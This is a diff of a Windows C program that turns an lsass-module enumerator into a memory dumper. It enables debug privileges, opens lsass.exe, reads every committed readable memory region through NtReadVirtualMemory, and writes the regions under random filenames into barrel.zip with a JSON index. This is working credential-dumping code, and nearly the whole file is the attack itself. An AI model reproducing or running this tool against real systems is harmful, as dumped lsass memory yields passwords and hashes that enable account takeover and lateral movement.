@@ -1,14 +1,15 @@
 #include <stdio.h>
 #include <windows.h>
+#include "miniz.h"
 
 
 // Constants
 #define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
-#define MAX_MODULES 1024
-// #define TOKEN_QUERY 0x0008
-// #define TOKEN_ADJUST_PRIVILEGES 0x0020
-// #define PAGE_NOACCESS 0x01
-// #define MEM_COMMIT 0x00001000
+//#define TOKEN_QUERY 0x0008
+//#define TOKEN_ADJUST_PRIVILEGES 0x0020
+//#define MAX_MODULES 1024
+//#define PAGE_NOACCESS 0x01
+//#define MEM_COMMIT 0x00001000
 
 
 // Structs
@@ -18,12 +19,12 @@ typedef struct _TOKEN_PRIVILEGES_STRUCT {
     DWORD Attributes;
 } TOKEN_PRIVILEGES_STRUCT, * PTOKEN_PRIVILEGES_STRUCT;
 
+
 typedef struct {
-    char base_dll_name[MAX_PATH];
-    char full_dll_path[MAX_PATH];
-    void* dll_base;
-    int size;
-} ModuleInformation;
+    char filename[20];
+    unsigned char* content;
+    size_t size;
+} MemFile;
 
 
 // Enums
@@ -35,12 +36,11 @@ typedef enum _PROCESSINFOCLASS {
 // Functions
 typedef NTSTATUS(WINAPI* NtOpenProcessTokenFn)(HANDLE, DWORD, PHANDLE);
 typedef NTSTATUS(WINAPI* NtAdjustPrivilegesTokenFn)(HANDLE, BOOL, PTOKEN_PRIVILEGES_STRUCT, DWORD, PVOID, PVOID);
+typedef NTSTATUS(WINAPI* NtCloseFn)(HANDLE);
 typedef NTSTATUS(WINAPI* NtGetNextProcessFn)(HANDLE, ACCESS_MASK, ULONG, ULONG, PHANDLE);
 typedef NTSTATUS(WINAPI* NtQueryInformationProcessFn)(HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG);
 typedef NTSTATUS(WINAPI* NtReadVirtualMemoryFn)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
 typedef NTSTATUS(WINAPI* NtQueryVirtualMemory_t)(HANDLE, PVOID, PVOID, PVOID, SIZE_T, PSIZE_T);
-typedef NTSTATUS(WINAPI* NtCloseFn)(HANDLE);
-//typedef NTSTATUS(WINAPI* NtClose_t)(HANDLE);
 
 
 // Skeletons
@@ -96,115 +96,6 @@ void EnableDebugPrivileges() {
     }
 
     printf("[+] Debug privileges enabled successfully.\n");
-}
-
-
-ModuleInformation* add_module(ModuleInformation* list, int counter, ModuleInformation new_module) {
-    static int size = MAX_MODULES;
-    // If the list is full, reallocate memory to double the size
-    if (counter >= size) {
-        size *= 2;
-        list = (ModuleInformation*)realloc(list, size * sizeof(ModuleInformation));
-        if (list == NULL) {
-            printf("[-] Memory allocation failed!\n");
-            return NULL;
-        }
-    }
-    list[counter] = new_module;
-    return list;
-}
-
-
-ModuleInformation* CustomGetModuleHandle(HANDLE hProcess) {
-    ModuleInformation* module_list = (ModuleInformation*)malloc(1024 * sizeof(ModuleInformation));
-    int module_counter = 0;
-
-    int process_basic_information_size = 48;
-    int peb_offset = 0x8;
-    int ldr_offset = 0x18;
-    int inInitializationOrderModuleList_offset = 0x30;
-    int flink_dllbase_offset = 0x20;
-    int flink_buffer_fulldllname_offset = 0x40;
-    int flink_buffer_offset = 0x50;
-
-    BYTE pbi_byte_array[48];
-    void* pbi_addr = (void*)pbi_byte_array;
-
-    ////////////////////////////////
-    // NtQueryInformationProcess
-    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
-    if (!hNtdll) {
-        printf("[-] Error loading ntdll.dll.\n");
-        return NULL;
-    }
-    NtQueryInformationProcessFn NtQueryInformationProcess = (NtQueryInformationProcessFn)GetProcAddress(hNtdll, "NtQueryInformationProcess");
-    if (!NtQueryInformationProcess) {
-        printf("[-] Error getting NtQueryInformationProcess function address.\n");
-        return NULL;
-    }
-    ////////////////////////////////
-
-    ULONG ReturnLength;
-    NTSTATUS ntstatus = NtQueryInformationProcess(hProcess, ProcessBasicInformation, pbi_addr, process_basic_information_size, &ReturnLength);
-    if (ntstatus != 0) {
-        printf("[-] Error calling NtQueryInformationProcess. NTSTATUS: 0x%08X\n", ntstatus);
-        return NULL;
-    }
-
-    void* peb_pointer = (void*)((uintptr_t)pbi_addr + peb_offset);
-    void* pebaddress = *(void**)peb_pointer;
-
-    //printf("[+] pbi_addr: \t\t0x%p \n", pbi_addr);
-    //printf("[+] peb pointer: \t0x%p\n", peb_pointer);
-    printf("[+] PEB Address: \t0x%p\n", pebaddress);
-
-    void* ldr_pointer = (void*)((uintptr_t)pebaddress + ldr_offset);
-    void* ldr_adress = ReadRemoteIntPtr(hProcess, ldr_pointer);
-
-    void* InInitializationOrderModuleList = (void*)((uintptr_t)ldr_adress + inInitializationOrderModuleList_offset);
-    void* next_flink = ReadRemoteIntPtr(hProcess, InInitializationOrderModuleList);
-
-    printf("[+] Ldr Pointer: \t0x%p\n", ldr_pointer);
-    printf("[+] Ldr Adress: \t0x%p\n", ldr_adress);
-    // printf("[+] next_flink: \t0x%p\n", next_flink);
-
-    void* dll_base = (void*)1337;
-    while (dll_base != NULL) {
-        next_flink = (void*)((uintptr_t)next_flink - 0x10);
-        // Get DLL base address
-        dll_base = ReadRemoteIntPtr(hProcess, (void*)((uintptr_t)next_flink + flink_dllbase_offset));
-
-        void* buffer = ReadRemoteIntPtr(hProcess, (void*)((uintptr_t)next_flink + flink_buffer_offset));
-
-        // printf("[+] next_flink: %p\n", next_flink);
-        // printf("[+] buffer: %p\n", buffer);
-        char* base_dll_name = ReadRemoteWStr(hProcess, buffer);
-        // printf("[+] base dll name: %s\n", base_dll_name);
-
-        // New ModuleInformation
-        ModuleInformation new_module;
-        strncpy_s(new_module.base_dll_name, base_dll_name, MAX_PATH - 1);
-
-        // Full DLL Path
-        //void* full_dll_name_addr = (char*)next_flink + flink_buffer_fulldllname_offset;
-        void* full_dll_name_addr = ReadRemoteIntPtr(hProcess, (void*)((uintptr_t)next_flink + flink_buffer_fulldllname_offset));
-        // printf("[+] full_dll_name_addr: %p\n", full_dll_name_addr);
-
-        char* full_dll_name = ReadRemoteWStr(hProcess, full_dll_name_addr);
-        // printf("[+] base dll name: %s\n", base_dll_name);
-        // printf("[+] full dll name: %s\n", full_dll_name);
-
-        // Complete ModuleInformation         
-        strncpy_s(new_module.full_dll_path, full_dll_name, MAX_PATH - 1);
-        new_module.dll_base = dll_base;
-        new_module.size = 0;
-        add_module(module_list, module_counter, new_module);
-        module_counter++;
-
-        next_flink = ReadRemoteIntPtr(hProcess, (void*)((uintptr_t)next_flink + 0x10));
-    }
-
-    return module_list;
 }
 
 
@@ -367,68 +258,72 @@ HANDLE GetProcessByName(const char* proc_name) {
 }
 
 
-// Function to find a module by name
-ModuleInformation find_module_by_name(ModuleInformation* module_list, int list_size, const char* aux_name) {
-    for (int i = 0; i < list_size; i++) {
-        if (strcmp(module_list[i].base_dll_name, aux_name) == 0) {
-            return module_list[i];  // Return a pointer to the matching module
-        }
+// Function to generate a random string
+void getRandomString(char* str, int length) {
+    static const char charset[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
+    for (int i = 0; i < length; i++) {
+        int key = rand() % (int)(sizeof(charset) - 1);
+        str[i] = charset[key];
     }
-    // no match is found
-    ModuleInformation empty_module = { "", "", NULL, 0 };
-    return empty_module;
+    str[length] = '\0';
 }
 
 
-// Function to find a module index by name
-int find_module_index_by_name(ModuleInformation* module_list, int list_size, const char* aux_name) {
-    for (int i = 0; i < list_size; i++) {
-        if (strcmp(module_list[i].base_dll_name, aux_name) == 0) {
-            return i;  // Return the index of the matching module
-        }
-    }
-    return -1;  // Return -1 if no match is found
+// Convert an array to JSON (simplified for string array)
+void toJson(char* json, const char* filename, const char* address, const char* regionSize) {
+    sprintf_s(json, sizeof(json), "{\"filename\":\"%s\", \"address\":\"%s\", \"regionSize\":\"%s\"}", filename, address, regionSize);
 }
 
 
-// Replace \ for \\ 
-void replace_backslash(char* str, char* result) {
-    int i, j = 0;
-    for (i = 0; str[i] != '\0'; i++) {
-        if (str[i] == '\\') {
-            result[j++] = '\\';
-            result[j++] = '\\';
-        }
-        else {
-            result[j++] = str[i];
+// Function to generate a zip file from the memfile_list
+void GenerateZip(const char* zipFilePath, MemFile memfile_list[], int memfile_count) {
+    // Delete the existing file if it exists
+    remove(zipFilePath);
+
+    // Create and open the ZIP archive
+    mz_zip_archive zip_archive;
+    memset(&zip_archive, 0, sizeof(zip_archive));  // Initialize the structure
+    if (!mz_zip_writer_init_file(&zip_archive, zipFilePath, 0)) {
+        printf("Error: Could not initialize ZIP archive '%s'.\n", zipFilePath);
+        return;
+    }
+
+    // Add each MemFile to the ZIP archive
+    for (int i = 0; i < memfile_count; i++) {
+        MemFile* m = &memfile_list[i];
+        // Add the file entry to the ZIP archive
+        if (!mz_zip_writer_add_mem(&zip_archive, m->filename, m->content, m->size, MZ_BEST_SPEED)) {
+            printf("Error: Could not add file '%s' to the ZIP archive.\n", m->filename);
+            mz_zip_writer_end(&zip_archive);  // Close the archive in case of error
+            return;
         }
     }
-    result[j] = '\0';
+
+    // Finalize and close the ZIP archive
+    if (!mz_zip_writer_finalize_archive(&zip_archive)) {
+        printf("Error: Could not finalize the ZIP archive.\n");
+    }
+
+    mz_zip_writer_end(&zip_archive);  // Always close the archive when done
+    printf("[+] File %s generated.\n", zipFilePath);
 }
 
 
-int Shock() {
+int Barrel() {
     EnableDebugPrivileges();
     HANDLE hProcess = GetProcessByName("C:\\WINDOWS\\system32\\lsass.exe");
     printf("[+] Process handle:\t%d\n", hProcess);
-
-    // List to get modules information
-    ModuleInformation* moduleInformationList = CustomGetModuleHandle(hProcess);
-    int module_counter = 0;
-
-    for (int i = 0; i < MAX_MODULES; i++) {
-        if (strcmp(moduleInformationList[i].base_dll_name, "")) {
-            module_counter++;
-            //printf("%d %s (%s)\n", module_counter, moduleInformationList[i].base_dll_name, moduleInformationList[i].full_dll_path);
-        }
-    }
-    printf("[+] Processed %d modules\n", module_counter);
 
     // Initialize variables
     long long proc_max_address_l = 0x7FFFFFFEFFFF;
     PVOID mem_address = 0;
     int aux_size = 0;
     char aux_name[MAX_PATH] = "";
+    MemFile memfile_list[1024];     // Fixed array for simplicity
+    int memfile_count = 0;          // Track number of MemFiles
+    char json_output[256*256] = "[";  // Buffer for JSON array
+    char json_item[256];           // Buffer for each JSON object
+
 
     // Loop through the memory regions
     while ((long long)mem_address < proc_max_address_l) {
@@ -443,55 +338,85 @@ int Shock() {
             printf("[-] Error calling NtQueryVirtualMemory. NTSTATUS: 0x%lx\n", ntstatus);
         }
 
-        // If readable and committed --> Get information
+        // If readable and committed -> Write memory region to a file
         if (mbi.Protect != PAGE_NOACCESS && mbi.State == MEM_COMMIT) {
-            // Find the module by name
-            ModuleInformation aux_module = find_module_by_name(moduleInformationList, module_counter, aux_name);
+            /*
+            // Allocate buffer for memory content
+            unsigned char* buffer = (unsigned char*) malloc(mbi.RegionSize);
+            if (!buffer) {
+                printf("Memory allocation failed\n");
+                return 1;
+            }
+            */
 
-            if (mbi.RegionSize == 0x1000 && mbi.BaseAddress != aux_module.dll_base) {
-                aux_module.size = aux_size;
-                // Find module index
-                int aux_index = find_module_index_by_name(moduleInformationList, module_counter, aux_name);
-                moduleInformationList[aux_index] = aux_module;
-                for (int k = 0; k < module_counter; k++) {
-                    if (mbi.BaseAddress == moduleInformationList[k].dll_base) {                        
-                        strcpy_s(aux_name, moduleInformationList[k].base_dll_name);
-                        aux_size = (int)mbi.RegionSize;
-                    }
-                }
+            // Generate random filename
+            char memdump_filename[14];
+            getRandomString(memdump_filename, 10);
+            strcat_s(memdump_filename, ".");
+            getRandomString(memdump_filename + 11, 3);
+            // printf("memdump_filename: %s\n", memdump_filename);
+
+            // ReadProcessMemory(GetCurrentProcess(), mbi.BaseAddress, buffer, mbi.RegionSize, &bytesRead); /// UPDATE!!!!
+            HMODULE hNtDll = LoadLibraryA("ntdll.dll");
+            if (hNtDll == NULL) {
+                printf("Failed to load ntdll.dll\n");
+                return 1;
             }
-            else {
-                aux_size += (int)mbi.RegionSize;
+
+            // Get the address of NtReadVirtualMemory function.
+            NtReadVirtualMemoryFn NtReadVirtualMemory = (NtReadVirtualMemoryFn)GetProcAddress(hNtDll, "NtReadVirtualMemory");
+            // Buffer to store the read bytes
+            SIZE_T regionSize = mbi.RegionSize;
+            BYTE* buffer = (BYTE*)malloc(regionSize);
+            if (buffer == NULL) {
+                printf("Failed to allocate memory for buffer\n");
+                return 1;
             }
+            SIZE_T bytesRead = 0;     // Number of bytes actually read
+
+            // Call NtReadVirtualMemory to read the memory from the remote process
+            NTSTATUS status = NtReadVirtualMemory(hProcess, mbi.BaseAddress, buffer, regionSize, &bytesRead);
+
+            if (status != 0 && status != 0x8000000D) { // 0x8000000D = Partial copy so its ok
+                printf("NtReadVirtualMemory failed with status: 0x%X\n", status);
+            }
+
+            // Format each JSON item: {"string", "0xVALUE1", "VALUE2"}
+            sprintf_s(json_item, "{\"field0\":\"%s\", \"field1\":\"0x%p\", \"field2\":\"%d\"}, ", memdump_filename, mem_address, mbi.RegionSize);
+            // Append the JSON item to the final JSON array
+            strcat_s(json_output, json_item);
+
+            // Add to MemFile array
+            MemFile memFile;
+            strcpy_s(memFile.filename, memdump_filename);
+            memFile.content = buffer;
+            memFile.size = mbi.RegionSize;
+            memfile_list[memfile_count++] = memFile;
         }
-        // printf("%p\n", mem_address);
+        // printf("[+]\t0x%p\n", mem_address);
         mem_address = (PVOID)((ULONG_PTR)mem_address + mbi.RegionSize);
     }
 
-    // Create JSON
-    char filename[] = "shock.json";
-    char json_output[256 * 400] = "[";  // Estimation
-    for (int i = 0; i < module_counter; i++) {
-        char full_dll_name_fixed[256];
-        replace_backslash(moduleInformationList[i].full_dll_path, full_dll_name_fixed);
-        
-        if (moduleInformationList[i].dll_base != 0) {
-            char json_item[256];
-            sprintf_s(json_item, sizeof(json_item),
-                "{\"field0\":\"%s\",\"field1\":\"%s\",\"field2\":\"0x%p\",\"field3\":\"%d\"}%s",
-                moduleInformationList[i].base_dll_name,
-                full_dll_name_fixed, // moduleInformationList[i].full_dll_path,
-                moduleInformationList[i].dll_base,
-                moduleInformationList[i].size,
-                (i < module_counter - 1) ? "," : "");
-            strcat_s(json_output, sizeof(json_output), json_item);
-        }
+    // Close handle
+    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
+    if (hNtdll == NULL) {
+        printf("[-] Error loading ntdll.dll.\n");
+        exit(-1);
     }
+    NtCloseFn NtClose = (NtCloseFn)GetProcAddress(hNtdll, "NtClose");
+    NtClose(hProcess);
+
+    // Close the JSON array
     size_t len = strlen(json_output);
-    json_output[len - 1] = '\0';
-    strcat_s(json_output, sizeof(json_output), "]");
+    json_output[len - 2] = '\0';
+    strcat_s(json_output, "]");
+
+    // Print the resulting JSON array
+    // printf("4");
+    // printf("%s\n", json_output);
 
     // Write to file
+    char filename[] = "barrel.json";
     FILE* file;
     errno_t err = fopen_s(&file, filename, "w");
     if (file == NULL) {
@@ -501,11 +426,28 @@ int Shock() {
     fprintf(file, "%s", json_output);
     fclose(file);
     printf("[+] File %s generated.\n", filename);
+
+    /*
+    for (int i = 0; i < memfile_count; i++) {
+        MemFile memFile = memfile_list[i];
+
+        // Print filename
+        printf("%d Filename: %s\tSize: %zu bytes", i, memFile.filename, memFile.size);
+        // Print the first few bytes (let's print up to 10 bytes or less if content is smaller)
+        printf("\tFirst bytes: ");
+        for (size_t j = 0; j < memFile.size && j < 10; j++) {
+            printf("%02X ", memFile.content[j]);
+        }
+        printf("\n");
+    }
+    */
+
+    GenerateZip("barrel.zip", memfile_list, memfile_count);
 }
 
 
 int main() {
-    Shock();
+    Barrel();
     return 0;
 }
 
